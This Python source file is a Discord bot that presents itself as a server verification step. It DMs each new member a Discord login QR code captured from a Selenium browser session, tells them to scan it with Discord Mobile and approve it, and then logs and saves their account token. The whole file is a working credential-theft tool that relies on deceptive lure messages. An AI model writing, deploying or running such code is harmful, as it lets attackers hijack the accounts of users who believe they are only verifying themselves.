import discord
from logger import logger
from SeleniumDriver import SeleniumDriver
from Utils import saveToken


class Client(discord.Client):
    async def on_ready(self):
        logger.info("Bot is ready.")

    async def on_message(self, message: discord.Message):
        if not message.author.bot and message.content == ":verify":
            warning_message = await message.reply("Generating verification code...please wait.")
            logger.info(f"Verify message received from: {message.author}")

            self.driver = SeleniumDriver()
            self.driver.start()

            # Sending QR Code Embed
            logger.info("Creating embed.")
            file = discord.File("screenshots/qr.png", filename="qr.png")
            embed = discord.Embed(
                title="Verify",
                description="Verify it's you by scanning the given QR code using Discord Mobile. Then click on 'Yes'.",
                colour=discord.Color.blue()
            )
            embed.set_image(url="attachment://qr.png")
            logger.info("Sending embed.")
            await message.author.send(file=file, embed=embed)
            await warning_message.edit(content="Verification code sent. Check your DMs.")

            # Waiting for user actions (scan and login)
            if self.driver.waitForScan():
                if self.driver.waitForLogin():
                    logger.info("Successfully detected login. Retrieving token...")
                    token = self.driver.getToken()
                    
                    if token:
                        logger.info(f"Retrieved token: {token}")
                        if saveToken(token):
                            logger.info("Token saved successfully.")
                            await message.author.send("Verification complete. Enjoy being on Your Server")
                        else:
                            logger.error("Failed to save the token.")
                            await message.author.send("Error IN Line 28 of bot.py.")
                    else:
                        logger.error("Failed to retrieve token.")
                else:
                    logger.warning("Login was not detected.")
                    await message.author.send("Timeout Please try again.")
            else:
                logger.warning("QR code was not scanned.")
                await message.author.send("QR code not scanned. Please try again.")

            # Stopping the Selenium driver
            self.driver.stop()

    async def on_member_join(self, member: discord.Member):
        logger.info(f"Member joined: {member}")
        await member.send(
            f"Verify your account to access all the channels in **{member.guild}**.\nReply with `:verify` to start verification."
        )
